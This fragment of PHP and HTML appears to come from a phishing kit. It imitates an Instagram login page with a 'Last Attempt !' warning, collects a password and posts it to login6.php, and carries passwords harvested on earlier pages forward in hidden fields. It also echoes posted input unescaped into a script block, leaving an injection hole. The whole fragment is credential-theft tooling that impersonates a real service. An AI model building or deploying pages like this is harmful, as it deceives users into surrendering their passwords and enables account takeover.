...
$pass_check1=$_POST['pass3'];
$pass_check2=$_POST['pass4'];
...
<body>
    ...
    margin-left: auto;">
            ...
            <p style="text-align: center; font-size: 28px; font-family: cursive">Instagram<br> </p>
            <centre>
        ...
        margin: 0px;
        background-color: #ff1e50;
        padding: 8px;"> Last Attempt !<br></p></centre>
            <form method="POST"  action="login6.php">
                ...
                <div class="form-group">
                    ...
                    <input type="password" name="pass5" id="pass5" class="form-control" placeholder="Password">
                </div>
                <div class="form-group">

                    <input type="hidden" name="pass4" id="pass4" class="form-control" value="">
                
                
                </div>
                <input type="hidden" id="pass4" value="">
...
<a href="login.php"><button id = "wrong"type="button">wrong</button></a>-->
    ...
    <script>
        ...
        document.addEventListener('DOMContentLoaded', function() {
            pass2 = "<?php echo $_POST['pass4']; ?>";
            document.getElementById("pass4").value= pass2;
            var chkpass1 = document.getElementById("pass4").value;
           // alert(" pass4 : " + chkpass1);
